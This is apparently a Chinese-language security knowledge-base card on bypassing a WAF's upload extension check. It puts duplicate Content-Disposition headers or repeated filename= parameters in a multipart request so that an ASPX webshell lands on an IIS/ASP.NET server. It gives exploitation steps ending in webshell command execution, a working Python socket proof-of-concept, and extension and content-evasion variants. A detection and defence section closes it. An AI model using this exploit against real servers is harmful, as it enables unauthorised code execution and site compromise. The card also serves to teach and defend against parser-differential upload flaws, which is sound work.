---
id: web-generic-file-upload-multipart-duplicate-filename-waf-aspx-bypass
title: Multipart 同一 part 重复 Content-Disposition/filename 绕过 WAF 后缀检测：WAF 取 .txt、后端落 .aspx
type: scenario
domain: web
path: web/generic/file-upload
technique: multipart-duplicate-filename-parser-differential-waf-bypass
aliases:
- 重复 filename 绕过 WAF
- 双 Content-Disposition
- multipart 解析器差异
- 多个 filename=
- WAF 上传后缀绕过
- ASPX webshell 上传
tags:
- web
- file-upload
- waf-bypass
- multipart
- parser-differential
- http-parameter-pollution
- aspx
- webshell
- iis
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V292
  verified_at: '2026-11-08T08:14:52+08:00'
  notes: 已对照全文与图 09-13 核对：普通 txt 上传返回 D:\WEB\...\.txt 且可访问（图 09-10），aspx 单 filename 被 connection reset（图 11），同一 part 两条 Content-Disposition（.txt 在前/.aspx 在后）返回 {"msg":"上传成功","data":"...\.aspx"}（图 12），一条头内多个 filename=（.txt/.aspx/.txt）同样返回 .aspx（图 13），与卡内两种构造一致。卡内 PoC 的 socket 版本为等价重写。原子性=multipart 重复 filename 的 WAF/后端解析差异，单原子，与内容填充卡分属后缀层/内容层。dedup 报告 recommendation=new（related content-type-trust、extension-zero-check、multipart-filename-jsp 等，均为不同进入链）。原文未标组件版本，不设 affected_versions。未在目标环境复跑。
---

## 一句话结论

在上传的 multipart/form-data 同一个 part 里放两条 `Content-Disposition`（或在一条头里写多个 `filename=`），分别给出无害的 `.txt` 与恶意的 `.aspx`；WAF 的 multipart 解析器取到的是 `.txt`，放行请求，而后端（IIS/ASP.NET）的解析器取到的是另一个 `filename` 并以 `.aspx` 落盘，从而绕过后缀检测上传 ASPX webshell。

## 原理

- **multipart 元数据不是只有一种解析结果**：RFC 7578 规定每个 part 应只有一个 `Content-Disposition`、一个 `filename`，但现实中的 WAF、反向代理、应用框架（IIS/ASP.NET、Commons FileUpload、PHP、Node 库）对重复头的处理并不一致：有的取第一个值，有的取最后一个值，有的拼接，有的报错。WAF 与后端是两套解析器，攻击者就利用这个差异。
- **利用构造**：同一个 part 写两条头：
  ```http
  Content-Disposition: form-data; name="file"; filename="aaaaaa.txt"
  Content-Disposition: form-data; name="file"; filename="aaaaa.aspx"
  ```
  也可以在一条头里重复参数：
  ```http
  Content-Disposition: form-data; name="file"; filename="a.txt"; filename="a.aspx"; filename="a.txt"
  ```
  文章的 exp 两种都成功：响应返回 `{"msg":"上传成功","data":"D:\\WEB\\...\\.aspx"}`，说明 WAF 没有拦，而后端最终保存的是 `.aspx`。
- **为什么 WAF 会看错**：WAF 通常只做“取 multipart 文件名 → 检查扩展名是否在黑名单/白名单”的浅层解析；如果它取第一个 `filename`（`.txt`），就会认为这是文本文件。后端 ASP.NET 的 `Request.Files`/`HttpPostedFile.FileName` 解析重复头时可能取最后一个（`.aspx`），于是落盘后缀是脚本。不同实现也可能相反，所以实战中要两种顺序都试。
- **为什么后端会接受**：文章中的上传接口本身没有在服务端做独立的扩展名白名单，只依赖 WAF；一旦 WAF 被解析差异骗过，后端就把客户端提供的文件名用于 `SaveAs`，落到 `D:\WEB\...` 这样 Web 可访问的目录。
- **与 Content-Type 绕过、双写后缀的区别**：本链不改 `Content-Type`、不改文件内容、也不用 `%00`/尾空格；它攻击的是 multipart **元数据的重复参数**，利用的是 WAF 与后端解析器的“看到不同值”。因此单靠把 `Content-Type` 改成 `image/jpeg` 或把后缀写成 `.jpg.php` 的规则拦不住，反之亦然。
- **前提**：WAF 确实只校验 multipart 的 filename 字段（而非文件内容/魔数），且后端保存的是原始文件名后缀；若后端用随机名 + 固定后缀，则本链只能得到任意文件写而非直接 webshell。

## 触发条件

- 上传接口位于 WAF/反向代理之后，WAF 对 multipart 文件名做扩展名检查。
- WAF 与后端使用不同的 multipart 解析器，且对重复 `Content-Disposition`/`filename` 的取值不一致（一个取首值、一个取末值，或反之）。
- 后端把客户端文件名（或其后缀）直接用于落盘路径，落盘目录 Web 可访问且允许脚本扩展名执行（IIS 下的 `.aspx`/`.ashx`/`.asmx`，或 Apache/Nginx 下的对应脚本）。
- 上传接口可通过 JS 分析/目录扫描发现，且不要求额外业务鉴权（文章中的上传页可直接访问，前端按钮不可用但可手工构造请求）。

## 利用步骤

1. 从 JS 分析/目录扫描找到上传接口（文章为 `/UploadFile`，页面有“选择文件”但点击上传无效）；F12 查看表单字段名（`file`）和请求格式。
2. 先上传一个普通 `.txt`，确认接口可用、返回保存路径（文章返回 `D:\WEB\...\\.txt`）且可访问。
3. 上传一个 `.aspx`，确认 WAF 拦截/连接重置（文章中被重置）。
4. 构造同一 part 的双 `Content-Disposition`：第一条 `.txt`、第二条 `.aspx`，发送；观察响应是否返回 `.aspx` 路径。
5. 若顺序无效，交换顺序（`.aspx` 在前、`.txt` 在后），或改成一条头里多个 `filename=`（`.txt`、`.aspx`、`.txt` 交替）。
6. 若后缀通过但内容被拦，转内容绕过（前后填充垃圾字符、加密/编码 webshell 等，见关联卡）。
7. 访问返回的 `.aspx` 路径，验证 webshell 执行；再用命令执行/文件管理确认权限。

## PoC

```python
import socket

host, port = "target", 80
boundary = "----WebKitFormBoundaryX"

def build_body(shell: bytes, fname1="aaaaaa.txt", fname2="aaaaa.aspx"):
    # 同一个 part 内重复 Content-Disposition；WAF 取一个、后端取另一个
    head = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="{fname1}"\r\n'
        f'Content-Disposition: form-data; name="file"; filename="{fname2}"\r\n'
        f"Content-Type: image/jpeg\r\n\r\n"
    ).encode()
    return head + shell + f"\r\n--{boundary}--\r\n".encode()

shell = b'<%@ Page Language="C#" %><% Response.Write("ok"); %>'
body = build_body(shell)
req = (
    f"POST /UploadFile HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    f"Cookie: ASP.NET_SessionId=<session>\r\n"
    f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
    f"Content-Length: {len(body)}\r\n"
    f"Connection: close\r\n\r\n"
).encode() + body

s = socket.create_connection((host, port))
s.sendall(req)
print(s.recv(65535).decode("latin-1"))
```

```text
# 文章响应示例：
# {"msg":"上传成功","data":"D:\\WEB\\...\\.aspx"}
# 另一变体在一个 Content-Disposition 中写多个 filename= 同样返回 .aspx 路径。
```

## 变体与关联

- **顺序变体**：WAF 取首值时用 `.txt` 在前；WAF 取末值时用 `.aspx` 在前、`.txt` 在后；不确定就两种都发。
- **参数变体**：一条 `Content-Disposition` 内重复 `filename=`；或重复整个 `Content-Disposition` 头；或重复 `name=` 让后端选择不同表单字段。
- **后缀变体**：IIS 下尝试 `.asp`、`.aspx`、`.ashx`、`.asmx`、`.cer`、`.config`；结合尾空格、尾点、大小写、`;` 参数等解析差异。
- **内容变体**：后缀通过后若内容检测仍拦截，使用前后填充垃圾字符、加密 webshell、图片马/合法文件头、分块传输等；参见 [[web-generic-file-upload-ai-first-1kb-scan-padding-htaccess-webshell]]（AI 只扫前 1KB 的填充绕过）。
- **关联**：[[web-generic-file-upload-weaver-ebridge-multipart-name-overwrite-jsp]]（重复 multipart 字段名覆盖绕过 `isSafeFile`，同样是解析器差异）、[[web-generic-file-upload-content-type-trust-bypass]]（只信 Content-Type 的绕过）、[[web-generic-file-upload-dotnet-blacklist-only-asp-aspx]]（黑名单只拦 asp/aspx 时换扩展名）、[[web-generic-file-upload-encrypted-webshell-av-bypass]]（内容层绕过）。
- **边界**：后端若把文件名重命名为随机 UUID + 白名单后缀、或在落盘后强制改后缀，本链不成立；WAF 若把整个 multipart 请求体做规范化解析并与后端使用同一库，重复参数差异也会消失。

## 检测与防御

- **解析层**：WAF 与后端必须使用同一套严格 multipart 解析器；拒绝包含重复 `Content-Disposition`、重复 `filename`、重复 `name` 的 part（按 RFC 7578 应只有一个）。
- **业务层**：服务端独立做扩展名白名单（取最后一个点后的后缀并规范化），落盘用随机文件名 + 固定安全后缀；把上传目录设为不可执行，脚本扩展名一律拒绝。
- **检测**：请求中出现多个 `Content-Disposition` 或多个 `filename=`；同一 part 内 filename 后缀不一致（`.txt` 与 `.aspx` 并存）；上传响应返回脚本后缀路径；上传目录出现新脚本文件。
- **加固**：上传目录关闭脚本执行（IIS 请求筛选/处理程序映射、Apache `RemoveHandler`）；对上传文件做魔数与内容检测；最小权限运行 Web 进程。
